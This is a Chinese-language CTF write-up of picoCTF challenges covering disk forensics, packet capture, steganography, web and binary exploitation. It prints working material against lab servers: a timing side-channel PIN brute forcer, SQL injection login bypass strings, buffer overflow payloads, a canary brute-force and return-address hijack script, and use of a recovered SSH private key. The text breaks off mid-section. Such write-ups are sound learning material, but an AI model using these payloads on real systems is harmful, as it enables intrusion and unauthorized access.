为了保证服务器的安全, 一般来说登陆服务器都需要密匙. 对于密钥, 
一般来说, 你肯定不会想让别人知道的. 所以这个题目的情况就像是, 
你的电脑磁盘被间谍拷贝了一份, 多么危险啊... 

用上面介绍的sleuthkit来解决问题: 

```shell
> mmls disk.img
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)
003:  000:001   0000206848   0000471039   0000264192   Linux (0x83)
> fls -o 206848 disk.img
d/d 458:	home
d/d 11:	lost+found
d/d 12:	boot
d/d 13:	etc
d/d 79:	proc
d/d 80:	dev
d/d 81:	tmp
d/d 82:	lib
d/d 85:	var
d/d 94:	usr
d/d 104:	bin
d/d 118:	sbin
d/d 464:	media
d/d 468:	mnt
d/d 469:	opt
d/d 470:	root
d/d 471:	run
d/d 473:	srv
d/d 474:	sys
V/V 33049:	$OrphanFiles
> fls -o 206848 disk.img 470
r/r 2344:	.ash_history
d/d 3916:	.ssh
> fls -o 206848 disk.img 3916
r/r 2345:	id_ed25519
r/r 2346:	id_ed25519.pub
> icat -o 206848 disk.img 2345 > id_ed25519
> chmod 600 id_ed25519
> ssh -i id_ed25519 -p 56167 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:56167 ([18.217.86.78]:56167)' can't be established.
ED25519 key fingerprint is SHA256:5gIm/EJ9bYnoH4qed83W5HXLfN1DO55849f6Lze0lx8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:13: [saturn.picoctf.net]:59808
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:56167' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@challenge:~$ ls
flag.txt
ctf-player@challenge:~$ cat flag.txt
picoCTF{k3y_5l3u7h_75b85d71}
```

这里稍微需要绕一点的地方就是, 偷来的密钥需要增加一个`600`的属性, 
然后可以连接到服务器上. 

### Eavesdrop
这次的问题类似于Packet Primer, 也是一个数据包的跟踪题目. 
检查了数据包里面的内容, 发现好像是一个类似于聊天对话的样子. 
看看? 

```text
9001  > 57876: Hey, how do you decrypt this file again?
57876 > 9001 : You're serious?
9001  > 57876: Yeah, I'm serious. 
57876 > 9001 : *sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
9001  > 57876: Ok, great, thanks.
57876 > 9001 : Let's use Discord next time, it's more secure.
9001  > 57876: C'mon, no one knows we use this program like this!
57876 > 9001 : Whatever. 
9001  > 57876: Hey.
57876 > 9001 : Yeah?
9001  > 57876: Could you transfer the file to me again?
57876 > 9001 : Oh great. Ok, over 9002?
9001  > 57876: Yeah, listening. 
# 中间有一段数据传输
57876 > 9001 : Sent it
9001  > 57876: Got it.
```

唔, 有画面了. 某天受害人在和它/他/她的朋友在聊天, 
然后聊天通道是一个完全没有加密的数据传输. 然后有一个笑面男, 
蹲在边上, 静静地听着, 然后悄悄地拿到了你的数据. Oops. 

然后看看那段数据传输的过程里面的东西: 

```irb
> flag = "\x53\x61\x6c\x74\x65\x64\x5f\x5f\xbf\x1f\x35\x43\xc1\x43\x7
d\x48\x9a\xc5\xc7\x00\xf4\x80\x91\x46\x79\x9c\x9d\x50\x3b\x55\x14\x76\xa3\xf0\x6
1\x59\x29\x3b\xee\x7c\x9e\x51\x83\xfb\x5c\x4a\x18\x4c"
 => "Salted__\xBF\u001F5C\xC1C}H\x9A\xC5\xC7\u0000\xF4\x80\x91Fy\x9C\x9DP;...
> File.open("flaag.enc", "w").write flag
```

嗯, 然后我把这个保存到了文件里面, 然后按照对话里面的做法, 
就可以轻松解码了. (才怪, 其实在解码的时候, 我遇到了一个很坑的问题, 
就是可能是因为我的openssl的版本的问题还是什么, 我在自己电脑上解码
就显示错误, 但是跑到picoCTF的服务器的在线shell上面就可以通过了. )

### Operation Orchild
感觉这种在磁盘里面找信息的题目有点上头.
知道方法了之后就非常简单了, 难点不过只是如何有效地找到磁盘里面的重要信息. 
就像我之前说的一样. 看终端的历史记录其实是一个比较有意思的突破口. 
所以我看看: 

这个是我在`root`文件夹里面找到的东西: 

```shell
> fls -o 411648 disk.flag.img 472
r/r 1875:	.ash_history
r/r * 1876(realloc):	flag.txt
r/r 1782:	flag.txt.enc
> icat -o 411648 -r disk.flag.img 1875
touch flag.txt
nano flag.txt 
apk get nano
apk --help
apk add nano
nano flag.txt 
openssl
openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567
shred -u flag.txt
ls -al
halt
```

通过查看终端的历史得到加密`flag.txt`的方法, 
然后就可以进行对应的解密方法. 

然后我遇到了奇葩的错误, 在picoCTF上面, 我解密了文本, 
然后解密的过程中告诉我bad encrypt, 好几次都是这样. 
然后我很无聊地就cat了一下输出的文件, 然后, 竟然, 
flag就在里面, 可以读到. 那为何告诉我解密失败? 怪.

解码的方法和前面的方法几乎就是一样的. 略. 

### St3g0
是文件隐写术的类型的题目. 这种东西, 怎么说呢, 有点神奇, 
我不是特别擅长这些. 但是最后我在网上发现了一个
[宝藏网站](https://0xrick.github.io/lists/stego/)

这道题我使用了一个叫做`zsteg`的gem. 简直就是自动化之神器. 

```shell
> gem install zsteg
> zsteg -a pico.flag.png
b1,r,lsb,xy         .. text: "~__B>VG?G@"
b1,rgb,lsb,xy       .. text: "picoCTF{7h3r3_15_n0_5p00n_a9a181eb}$t3g0"
```

### SideChannel
这个题目一开始我是想不出来的. Side Load Attack是一种Web里面的攻击方法, 
类似于通过程序运行的一些侧面表现来旁敲侧击来看看攻击是否成功. 
比如在SQL注入里面, 有一种时间注入法, 通过看看有没有执行注入的时停代码, 
假如能够时停的话, 就说明你的攻击成功啦. 

嗯, 这道题的做法大概就是这样的. 虽然我没有非常严格地分析一下程序的汇编, 
然后程序的机理没有特别的了解. 基本上我看到的像是一个对输入的每一位, 
都进行一个处理, 然后根据程序的表现来看看是否有成功的迹象. 

最后我猜测应该是假如成功的话, 就会执行代码, 然后运行的时间就会比其他
错误的情况要长一些. 所以基于这个想法, 我编写了一个测试的程序: 

```ruby
def test(str)
  t = Time.new
  handler = IO.popen "./pin", "w+"
  handler.puts str.ljust(8, "0")
  res = ""
  while read = handler.gets
    res << read
  end
  time = Time.new - t
  puts res + str + "#{time}"
  return time
end

charset = ("0".."9").to_a
playload = ""

8.times do
  max_time = 0
  the_c = ""
  charset.each do |c|
    t = test(playload + c)
    if t > max_time
      max_time = t
      the_c = c
    end
  end
  playload << the_c
end
```

不过还是有运气的成分啦. 
因为我发现在后来复现的时候, 上面的代码并不能成功解决, 
可能是我写错了, 因为一开始我是手动暴力匹配的, 
通过一个个的测试(当然, 是每次用代码测试一位, 然后每次看到可能的数字的时候, 
就会多试几次, 看看是不是真的是最长时间. 可能是因为虚拟机的原因, 
我的那个虚拟机有时候会输出一个非常离谱的运行时间... )

```shell
> nc saturn.picoctf.net 50364
Verifying that you are a human...
Please enter the master PIN code:
48390513
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_914c5ec3}
```

## Web
### Includes
F12检查代码, 在Sources里面检查, 发现script.js
和style.css里面有注释, 注释里面有flag

### Inspect HTML
在源代码里面发现了一句注释: 
```html
<!--picoCTF{1n5p3t0r_0f_h7ml_fd5d57bd}-->
```

真就是检查HTML... 

### Search Source
在Hints里面告诉我要mirror site, 然后再搜索, 
嗯... 这就学起来: 

首先是如何将网站mirror下来: 
[How to Easily Mirror an Entire Web Site Locally](https://osxdaily.com/2009/03/19/how-to-easily-mirror-an-entire-web-site-locally/)

上面的说法, 应该用`wegt`命令来, 试试. 

然后是如何使用高级的搜索方法... 看我的: 

```shell
> find . -name "flag"
> grep --color=auto -iRnH 'pico' *
css/style.css:328:/** banner_main picoCTF{1nsp3ti0n_0f_w3bpag3s_8de925a7} **/
```

输出结果很漂亮哦. 

### SQL Direct
这里用的是一套和mysql不一样的数据库系统. 
不过虽然有点点不一样, 但是最终的SQL查询语句还是一样的. 

首先是连接到远程的数据库: 

```shell
> psql -h saturn.picoctf.net -p 52302 -U postgres pico
Password for user postgres: 
psql (14.2)
Type "help" for help.
```

然后列出(list)数据库: 

```shell
pico=# \l
                                 List of databases
   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------+----------+----------+------------+------------+-----------------------
 pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
(4 rows)

```

然后选择(choose)数据库: 

```shell
pico=# \c pico
You are now connected to database "pico" as user "postgres".
```

通过`\d [table]`来查看表单信息: 

```shell
pico=# \d
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)

pico=# \d flags
                        Table "public.flags"
  Column   |          Type          | Collation | Nullable | Default 
-----------+------------------------+-----------+----------+---------
 id        | integer                |           | not null | 
 firstname | character varying(255) |           |          | 
 lastname  | character varying(255) |           |          | 
 address   | character varying(255) |           |          | 
Indexes:
    "flags_pkey" PRIMARY KEY, btree (id)

```

于是就是经典的SQL查询啦: 

```shell
pico=# SELECT * FROM flags;
 id | firstname | lastname  |                address                 
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{L3arN_S0m3_5qL_t0d4Y_21c94904}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 rows)

pico=# \q
```

(最后的`\q`就是退出(quit)了)

### SQLiLite
是 SQL 注入诶. 甚至还是有返回信息的注入诶, 这可不要太简单, 
甚至可以手动尝试: 

```irb
3.0.0 :001 > require 'net/http'
 => true 
3.0.0 :002 > uri = URI('http://saturn.picoctf.net:50587')
 => #<URI::HTTP http://saturn.picoctf.net:50587> 
3.0.0 :003 > res = Net::HTTP.post_form(uri, 'username' => 'admin', 'password' =>
 'password')
 => #<Net::HTTPOK 200 OK readbody=true>
3.0.0 :004 > puts res.body
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username" class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>

                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
 => nil 
```

首先观察登录方式, 是在`login.php`里面用POST方法登陆的. 
然后随便构造一个测试一下: 

```irb
3.0.0 :005 > uri = URI('http://saturn.picoctf.net:50587/login.php')
 => #<URI::HTTP http://saturn.picoctf.net:50587/login.php> 
3.0.0 :006 > res = Net::HTTP.post_form(uri, 'username' => 'admin', 'password' =>
 'password')
 => #<Net::HTTPOK 200 OK readbody=true> 
3.0.0 :007 > puts res.body
<pre>username: admin
password: password
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;password&#039;
</pre><h1>Login failed.</h1>
 => nil
```

发现这个直接就把查询的语句给放上来了, 这可真的是不妙啊, 
于是我一开始准备写一个测试用的函数来方便多次手工注入, 结果, 
让我失望的是, 这个直接就被万能公式给解决了: 

```irb
3.0.0 :009 > def test(username, password)
3.0.0 :010 >   uri = URI('http://saturn.picoctf.net:50587/login.php')
3.0.0 :011 >   res = Net::HTTP.post_form(uri, 'username' => username, 'password'
 => 'password')
3.0.0 :012 >   puts res.body
3.0.0 :013 >   res.body
3.0.0 :014 > end
 => :test 
3.0.0 :015 > test("admin' or 1=1-- -", "password")
<pre>username: admin&#039; or 1=1-- -
password: password
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; or 1=1-- -&#039; AND password=&#039;password&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}</p>
 => "<pre>username: admin&#039; or 1=1-- -\npassword: password\nSQL query: SELECT * FROM users WHERE name=&#039;admin&#039; or 1=1-- -&#039; AND password=&#039;password&#039;\n</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}</p>"
```

轻松. 

### Power Cookie
看名字肯定是改 Cookie, 试了几次, 从`true`, `True`, 
最后改成了`1`, 然后通过了. 

思考网站的背后的机制, 应该是http://saturn.picoctf.net:61304/
将Cookie写入, 并写成`0`, 然后在http://saturn.picoctf.net:61304/check.php
检查名字叫做`isAdmin`的`Cookie`的值.

后来思考了一下, 为什么一开始没有成功, 原因估计就是我没搞清楚机制, 
在主网页更新了Cookie, 但是跳转到check页的时候Cookie被无视了, 
于是导致了我死活登录不上. 

稍微介绍一下, Cookie有点像是古代皇上给臣子的那种免死金牌, 
网站把Cookie给到你的游览器, 然后下一次你登陆网站的时候, 
亮出你的免死金牌, 网站就会把你轻松放过. 但是免死金牌有时候也有时限, 
比如换了新的皇帝, 你的前朝金牌就没有那么吃香了. 所以你就要重新认证, 
让服务器重新给你一块免死金牌. 或者是这个皇帝很小心, 怕别人伪造, 
(对不起, 这道题里面的你就要伪造免死金牌啦), 经常更换. 
也会导致你需要重新认证. 说白了, 免死金牌虽然给用户带来了方便, 
但是因为可以伪造, 并且读取Cookie会有记录用户数据的考虑. 

### Local Authority
这道题的名字非常有提示意味, 真的是在本地来检测登陆认证的. 

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Login Page</title>
  </head>
  <body>
    <script src="secure.js"></script>
    
    <p id='msg'></p>
    
    <form hidden action="admin.php" method="post" id="hiddenAdminForm">
      <input type="text" name="hash" required id="adminFormHash">
    </form>
    
    <script type="text/javascript">
      function filter(string) {
        filterPassed = true;
        for (let i =0; i < string.length; i++){
          cc = string.charCodeAt(i);
          
          if ( (cc >= 48 && cc <= 57) ||
               (cc >= 65 && cc <= 90) ||
               (cc >= 97 && cc <= 122) )
          {
            filterPassed = true;     
          }
          else
          {
            return false;
          }
        }
        
        return true;
      }
    
      window.username = "admin";
      window.password = "password";
      
      usernameFilterPassed = filter(window.username);
      passwordFilterPassed = filter(window.password);
      
      if ( usernameFilterPassed && passwordFilterPassed ) {
      
        loggedIn = checkPassword(window.username, window.password);
        
        if(loggedIn)
        {
          document.getElementById('msg').innerHTML = "Log In Successful";
          document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
          document.getElementById('hiddenAdminForm').submit();
        }
        else
        {
          document.getElementById('msg').innerHTML = "Log In Failed";
        }
      }
      else {
        document.getElementById('msg').innerHTML = "Illegal character in username or password."
      }
    </script>
    
  </body>
</html>
```

观察网页的源代码, 我发现了一个叫做`checkPassword`的函数, 
然后顺藤摸瓜, 发现这个函数竟然就是一个本地的js... 怪不得叫做是本地验证. 
直接就把源码写在网页的脚本里面, 属于是客户端检查了, 而不是服务器检查了. 

```javascript
function checkPassword(username, password)
{
  if( username === 'admin' && password === 'strongPassword098765' )
  {
    return true;
  }
  else
  {
    return false;
  }
}
```

所以用户名和密码就显而易见了. 

但是后来我觉得这种方法还是太一般了, 我为何不直接执行验证成功的语句, 
这样不是更加方便吗? 所以: 

在游览器的console里面运行js脚本就好了. 

```javascript
> document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
> document.getElementById('hiddenAdminForm').submit();
```

### Roboto Scans
题目的名字非常有提示功能, 就是有很多的网站, 
为了不想被像谷歌那样的爬虫爬取信息, 就会在网站根地址里面放一个`robots.txt`, 
大概就像是贪官污吏在上头巡抚来检查的时候, 悄咪咪塞了一张金条, 
底下附上了一张条子: 啊, 巡抚大人, 生活不易, 请放我一马, 
然后不要检查下面的这个, 这个, 还有那个文档和目录... 
于是谷歌搜索引擎的爬虫就会跳过那些地址. (我记得淘宝就有类似的东西, 大概吧)

那么访问之http://saturn.picoctf.net:64710/robots.txt
得到: 

```text
User-agent *
Disallow: /cgi-bin/
Think you have seen your flag or want to keep looking.

ZmxhZzEudHh0;anMvbXlmaW
anMvbXlmaWxlLnR4dA==
svssshjweuiwl;oiho.bsvdaslejg
Disallow: /wp-admin/
```

然后解码里面像是base64的东西, 最后得到: 

```text
flag1.txt;js/myfi
js/myfile.txt
???
```

然后依次去试试看, 最终在`js/myfile.txt`里面看到flag.

### Secret
用的是`dirsearch`来搜索, 结果找到了一个
http://saturn.picoctf.net:49917/secret/index.html
看起来挺有用但是好像啥也没有用的东西. 

然后还有一个
http://saturn.picoctf.net:49917/secret/assets/

但是继续往下好像没有什么东西

`dirsearch`不行了, 但是我在最开始的界面里面有一个`hidden`的提示, 
所以我又行了: 
http://saturn.picoctf.net:49917/secret/hidden/

就是新的问题, 留给新的一天来解决吧. 

破案了, 没必要了, 这个该死的家伙, 一路在嘲讽. 

在`hidden`里面的代码里面看到了一个: 
`<input type="hidden" name="db" value="superhidden/xdfgwd.html" />`

然后最后得到了: 
http://saturn.picoctf.net:49917/secret/hidden/superhidden/

代码里面才有flag, 因为flag是和背景色一样的. 
picoCTF{succ3ss_@h3n1c@10n_790d2615}

### 注
note和Live Art我认为应该是XSS和跨站脚本攻击之类的, 但是因为不太熟, 
所以没有做出来. 

## basic file exploit
得到是程序的 C 的源码. 

(我是傻叉, 还以为这个问题是一个什么很难的问题, 
以为是要利用什么堆溢出的攻击方法, 没想到, 没想到. 
对于堆溢出, 我可是一点也不会啊... )

观察程序, 发现在开头部分有一个读取flag的操作. 
然后仔细观察, 发现这个flag只在一个地方被使用了, 
就是第144行: 

```C
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```

嗯, 所以只要让这个if条件成立就好, 那么就要让entry_number=0, 
然后就可以了. 运行程序, 一开始直接去读的话发现无法读取程序, 
因为没有写入任何的东西, 所以随便写一个东西, 然后再去读取程序: 

```shell
> nc saturn.picoctf.net 49700
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
2
2
No data yet
1
1
Please enter your data:
anything
anything
Please enter the length of your data:
6
6
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_9F68795F}
```

解决问题.

### buffer overflow 0 & 1 & 2 & 3
栈溢出的问题, 其实不是很难. 

#### buffer overflow 0
看题目名字就知道要溢出, 看代码里面有一个`sigsegv_handler`函数, 
还有一个`strcpy`函数, 可见应该是`strcpy`函数在拷贝字符串的时候没有
限制, 导致拷贝的东西溢出了, 这样就会触发`SIGSEGV`信号, 
导致调用`sigsegv_handler`函数. 

(注: 关于信号的话, 可以参考`man signal`)

解决问题: 

```shell
> nc saturn.picoctf.net 51110
Input: test
The program will exit now
> ruby -e ' print "Lucky_Magic" * 10 ' | nc saturn.picoctf.net 51110
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```

就这样.

#### buffer overflow 1
只要修改最后的ret地址就可以实现任意地址跳转了, 
好的, 用gdb查看跳转的位置: 

```shell
> gdb vuln
gdb-peda$ r <<< $( ruby -e ' t = "z"; 100.times do print(t.succ!) end ' )
...
Stopped reason: SIGSEGV
0x78617761 in ?? ()
```

然后计算偏移量: 

```irb
3.0.0 :001 > t = "z"; 100.times do print(t.succ!) end
aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcsctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudv => 100 
3.0.0 :002 > s = "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbe
bfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcs
ctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudv"
 => "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhb... 
3.0.0 :003 > addr = "\x78\x61\x77\x61"
 => "xawa" 
3.0.0 :004 > s.index addr.reverse
 => 44
```

然后用ghidra找到`win`函数的地址: `080491f6`, 
然后运行: 

```shell
> ruby -e 'print "a" * 44 + "\x00\x00\x00\x00\x08\x04\x91\xf6".reverse' | nc saturn.picoctf.net 62004
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_c76b273b}
```

结束.

为了防止你不太懂, (假如是高手的话, 请跳过吧)
之所以会有栈溢出这样的东西, 是因为计算机里面, 为了储存局部变量, 
就需要通过开辟一个临时的空间来放. (这个可以去我的
[Computer Toys]({{ site.github.url }}/ruby/ri-lang), 或者之前的
[Stack]({{ site.github.url }}/ctf/stack/)看看, 
并且我打算最近更新一下Stack, 因为有了新的理解了. )

这个临时空间是这样的一个概念, 假如我要放一个长度为10的数组, 
那么我就要开辟一个大小为10的空间, 也不用太多, 防止浪费. 
然后在写数据的时候, 就按照位置来写入数据. 但是这个时候, 
可能就会出现一个问题: 如果我往数组的第11个位置写入了数据会怎么办? 
谁也不知道会怎么办, 毕竟(我觉得)一开始人们并没有想过这样的问题, 
设计者绝对想不到自己的使用者都是这样的奇怪的人. 
所以当你写的时候, 就会写到原本开辟的空间外面, 比如说, 
写到了函数的返回地址里面. 

关于这个, 简单理解就像是, 函数调用就好像是刘禅(小名阿斗, 
比如说是计算机的eip寄存器, 
就是指向当前CPU运行的命令的地址的一个寄存器)
被捉到了一个新的地方(eip跳转到了函数的区域), 本来心里面还有蜀国
(也就是原来调用函数的主程序的地址, 被储存在栈里面), 
但是你的play太奇怪了, 让他心里(也就是计算机的栈里面储存的返回地址)
的某些东西被被改变了, 导致他乐不思蜀(返回地址被修改了), 回不去了, 
最后就到了奇怪的地方, 可能会被利用了. (比如说让计算机返回一个特定的地址, 
然后执行特定的函数). 上面的过程就是这么样的一个过程. 

#### buffer overflow 2
这次除了要修改函数的返回地址, 还要修改函数的传入参数, 
坏了, 我不知道传入参数在哪里写啊, 所以先用土法来炼金. 

```shell
> file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1c57f0cbd109ed51024baf11930a5364186c28df, for GNU/Linux 3.2.0, not stripped
> chmod +x vuln
> gdb ./vuln
gdb-peda$ r <<< $( ruby -e ' t = "z"; 200.times do print(t.succ!) end ' )
Stopped reason: SIGSEGV
0x66636563 in ?? ()
```

```irb
3.0.0 :001 > t = "z"; 200.times do print(t.succ!) end
aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcsctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudvdwdxdydzeaebecedeeefegeheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffgfhfifjfkflfmfnfofpfqfrfsftfufvfwfxfyfzgagbgcgdgegfggghgigjgkglgmgngogpgqgrgsgtgugvgwgxgygzhahbhchdhehfhghhhihjhkhlhmhnhohphqhr => 200 
3.0.0 :002 > s = "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbe
bfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcs
ctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudvdwdxdydzeaebecedeeefeg
eheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffgfhfifjfkflfmfnfofpfqfrfsftfu
fvfwfxfyfzgagbgcgdgegfggghgigjgkglgmgngogpgqgrgsgtgugvgwgxgygzhahbhchdhehfhghhhi
hjhkhlhmhnhohphqhr"
 => "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhb... 
3.0.0 :003 > addr = "\x66\x63\x65\x63"
 => "fcec" 
3.0.0 :004 > s.index addr.reverse
 => 112
```

一点点解释: 观察代码, 发现`win`函数里面, 比较的代码是: 
```asm
   0x0804930c <+118>:	cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 <+125>:	jne    0x804932f <win+153>
   0x08049315 <+127>:	cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c <+134>:	jne    0x8049332 <win+156>
```

于是只要往所谓的`ebp+0x8`和`ebp+0xc`里面写入想要的数据就好了. 
为了找到写的数据的位置, 也可以用更写一堆乱七八糟的东西, 
然后运行, 在比较的代码上面设断点, 最后看看数据就知道写了啥了. 

然后就是无聊的`playload`的时间了: 

```shell
ruby -e ' print "a" * 112 + "\x00\x00\x00\x00\x08\x04\x92\x96".reverse + "\xCA\xFE\xF0\x0D".reverse + "\xF0\x0D\xF0\x0D".reverse ' | nc saturn.picoctf.net 51137
```

再说一嘴: 这里能够写入参数的原因是因为这些参数是通过栈来传递的, 
也就是说, `func(arg)`就像是这样: 

```asm
PUSH arg
CALL func
```

来调用的. 

#### buffer overflow 3
题目说自己有一个栈保护检查, 也就是CANARY检查, 
实际上并没有真正的检查, 只是一种类似的思想而已. 

这个思想就是, 既然你想要通过写爆栈来干坏事, 
那么程序就在每个栈末尾留一个保护字串, 假如保护字串被修改了, 
那么拒绝跳转, 并告诉你干坏事是不对的. 就像是以前很多的电子产品, 
有一个撕毁不保修的封条. 假如你撕坏了保修封条, 那么恭喜, 
维修商就不会为你维修啦. 

但是我们可以伪造一个和这个封条一毛一样的假封条, 
在拆开之后(栈溢出的时候), 再把假封条贴回去. 具体的做法就是: 

```ruby
require "socket"
require "colorize"

URL = "saturn.picoctf.net"
PORT = 49518

CHARSET = ("a".."z").to_a + ("0".."9").to_a + ("A".."Z").to_a
LEN = CHARSET.length

# 测试函数
def connect(message)
  # TCP 连接到服务器
  s = TCPSocket.new(URL, PORT)
  s.puts message
  res = ""
  while (get = s.gets)
    res << get
  end
  # 返回服务器的输出
  return res
end

# 按位爆破
canary = ""
# 题目里面说总长度是4
4.times do |i|
  # 每一个字符进行一个爆破
  LEN.times do |j|
    # puts (temp_canary = canary + CHARSET[j])
    temp_canary = canary + CHARSET[j]
    res = connect("#{64 + i + 1}\n" + "a" * 64 + temp_canary)
    # 成功的样子
    if res.match(/Flag/)
      canary = temp_canary
      puts canary.colorize(:green)
      break
    end
  end
end

puts connect("100\n"+"a" * 64 + canary + "a" * 16 + "\x00\x00\x00\x00\x08\x04\x93\x36".reverse)

# => How Many Bytes will You Write Into the Buffer?
# > Input> Ok... Now Where's the Flag?
# picoCTF{Stat1C_c4n4r13s_4R3_b4D_9602b3a1}
```

### CVE-XXXX-XXXX
一道历史题... 

[相关历史](https://blog.qualys.com/vulnerabilities-threat-research/2021/07/07/microsoft-windows-print-spooler-rce-vulnerability-printnightmare-cve-2021-34527-automatically-discover-prioritize-and-remediate-using-qualys-vmdr)

有点意思, 没想到老是背锅的Windows在这里都不放过对它的鞭尸. 
具体的我就不了解了. 这道题就是一个联系搜索引擎的题目. 
仅此而已.

> The CVE we're looking for is the first recorded 
> remote code execution (RCE) vulnerability in 2021 
> in the Windows Print Spooler Service, which is 
> available across desktop and server versions of 
> Windows operating systems. The service is used to 
> manage printers and print servers.

### RPS
题目是一个剪刀石头布的比赛, 正常应该是通过时间和伪随机数来攻击, 
得到其输出的规律. 但是我发现: 

发现这个比较石头剪刀布的胜利与否的函数竟然是一个
`strstr`函数, 也就是说, 只要有匹配的字符串, 那么就会胜利. 

于是构造这样的出拳: `rockpaperscissors`, 这样呢, 会怎么样? 

```ruby
6.times do
  puts "1", "rockpaperscissors"
end
```

呃, 完胜啊. (小孩子才做选择, 我全都上. )

`picoCTF{50M3_3X7R3M3_1UCK_C85AF58A}`

### x-sixty-what
这个题目和之前的问题很像. 

```shell
> gdb vuln
gdb-peda$ i functions 
0x00000000004012b2  vuln
gdb-peda$ r <<< $( ruby -e ' t = "z"; 100.times do print(t.succ!) end ' )
Stopped reason: SIGSEGV
0x6e626d626c626b62 in ?? ()
```

```irb
